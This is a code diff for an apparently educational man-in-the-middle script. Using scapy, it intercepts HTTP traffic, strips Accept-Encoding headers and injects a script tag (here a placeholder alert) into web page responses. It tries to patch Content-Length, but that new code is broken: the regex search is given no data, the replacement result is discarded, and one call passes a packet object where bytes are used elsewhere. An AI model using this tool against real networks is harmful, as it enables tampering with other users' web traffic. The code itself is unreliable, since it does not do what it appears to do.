@@ -18,16 +18,19 @@ def process_packet(packet):
             modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(bytes(new_packet))
-            del scapy_packet[scapy.IP].len
-            del scapy_packet[scapy.IP].chksum
-            del scapy_packet[scapy.TCP].chksum
-            print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("HTTP Request")
-            modified_load = scapy_packet[scapy.Raw].load.replace(b"</head>", b"<script>alert('test')</script></head>")
+            print("HTTP Response")
+            injection_code = b"<script>alert('test')</script>"
+            injection_code_len = len(injection_code)
+            modified_load = scapy_packet[scapy.Raw].load.replace(b"</head>", injection_code + b"</head>")
+            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)")
+            if content_length_search:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + injection_code_len
+                new_content_length = b"%d" %(new_content_length)
+                modified_load.replace(content_length, new_content_length)
             new_packet = set_load(scapy_packet, modified_load)
             packet.set_payload(new_packet)
-            print(scapy_packet.show())
     packet.accept()
 
 
